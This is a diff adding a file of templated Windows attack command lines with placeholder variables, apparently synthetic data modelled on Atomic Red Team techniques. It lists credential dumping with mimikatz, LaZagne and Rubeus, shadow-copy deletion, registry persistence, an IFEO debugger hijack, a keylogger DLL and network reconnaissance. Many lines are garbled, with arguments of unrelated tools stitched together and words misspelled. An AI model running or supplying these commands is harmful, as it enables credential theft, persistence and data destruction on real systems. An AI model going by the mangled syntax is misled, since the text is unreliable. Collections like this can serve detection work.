@@ -1,0 +1,64 @@
+net user $ { input_folder_name } $ { output_file_name } $ { command }
+new-aduser @ destination_file $ { timeout } -f $ { -d { path } /y }
+sekurlsa : :logonpasswords
+net user $ { user_name } $ { command } -u
+net user $ { user_name } -l $ { binary_path }
+bitsadmin.exe /resume $ { domain }
+namp -sn $ { domain }
+psr.exe /start /output $ { output_zip } /sc 1 .starttype reg_sz /d `` $ { command } '' /f
+bitsadmin.exe /resume $ { bits_job_name }
+$ filter=set-wmiinstance -class __eventfilter /v altitude
+vssadmin delete shadows /shadow= $ { id name you create } \windows\ntds\ntds.dit $ _.status -eq 'running '
+open $ { domain }
+get-childitem $ { js_script }
+lazagne.exe windows
+$ wscriptshell = new-object -list -o shortcutlocation = `` '' c : account logon '' /success : disable
+hashcat.exe -m sc.exe start
+reg add `` hklm\system\currentcontrolset\control\print\monitors\atomicredteam '' /v `` atomic packages '' /t reg_sz /d `` $ { timeout }
+out-minidump.exe
+save vhost -u $ { port } $ { domain }
+lazagne.exe windows
+$ user `` $ { path } /sid
+reg save hklm\systyem $ target domain } -l $ { ip_address } $ filtertoconsumerargs
+ren $ { domain }
+rubeus.exe kerberoast /domain `` $ { domain }
+fsutil.exe trace decode
+copy $ { range_start } in $ { ip_prefix } /krbtgt : $ { range_step } )
+get-localgroupmember -group users
+copy $ { malicious_exe_path } c : \windows\system32\
+gobuster dir -u '' $ { { limit }
+net user administrator /domain
+reg add `` hkcu\software\classes\clsid\ { ab8902b4-09ca-4bb6-b78d-a8f59079a8d5 } \inprocserver32 '' /v `` autorun '' '' 0 0 /d `` $ { binary__file_path } '' '' , `` $ { command } ''
+rdrleakdiag.exe /p $ { timeout } -f $ { lsass_pid } -w $ { lsass_pid } $ { 1000 }
+/l % net.webclient ) \\ $ { command } , $ { range_step } , $ { copy path } -p $ { range_end } )
+lsadump : :golden /user : $ { range_step ) } /sid : $ { path } /ntlm : appdata\microsoft\windows\start ftp $ { range_end ) )
+mimikatz.exe `` kerberos : :list windir : \users\ $ { system file }
+wscript $ { malicious_binary } as % temp % \ $ { binary }
+sekurlsa : :logonpasswords
+reg add `` hkcu\software\microsoft\windows\currentversion\run '' /v `` appinit_dlls '' /add /f , imagepath /d $ { 1 /d $ { binary_file_path } ''
+fltmc.exe unload $ { service_name }
+silentrunner.exe $ { command }
+adfind -users
+wmic process list | findstr spooler )
+net localgroup administrators $ { domain }
+ffuf -w $ { password } > $ { encoded end_address } /krbtgt : } -accepteula : psexec.exe \\ $ { domain } , spooler )
+query user /server : # { bits_job_name }
+psexec.exe \\ $ { username } /domain
+% localappdata % \microsoft\teams\current\teams.exe
+hklm\software\microsoft\windows\currentversion\runonce /launch : $ { action } -u $ { command }
+`` import set \\ : administrator file { ip_address } -a $ { binary }
+reg save processors\atomicredteam '' /v userinit /d `` 1 ''
+tracert $ { url abc.exe.txt
+rundll32 keylogger_dll.dll , keylog
+lazagne.exe windows
+iex ( iwr minidump % -r $ { domain_sid } -m id objws = createobject ( `` packet '' ) ;
+copy $ { malicious_exe_path } \ $ { flag }
+ffuf -w $ { password } `` $ { domain } \ $ { lsass_lib.dll_path } $ { binary_path } / /y
+get-aduser -filter -sc
+get-eventlog write-host `` clearing $ shell.createshortcut ( $ ( username `` $ { username ) ;
+ffuf $ { binary_path } wordlist
+lazagne.exe /z
+reg add `` hklm\software\microsoft\windows nt\currentversion\image file execution options\svchost.exe '' /v debugger /d $ { /f }
+theharvester -d $ { domain }
+quser
+reg add `` hkcu\software\microsoft\windows nt\currentversion\winlogon\notify\atomicredteam '' /t reg_dword /v reportingmode /d 0 /d logon /d `` $ { command }
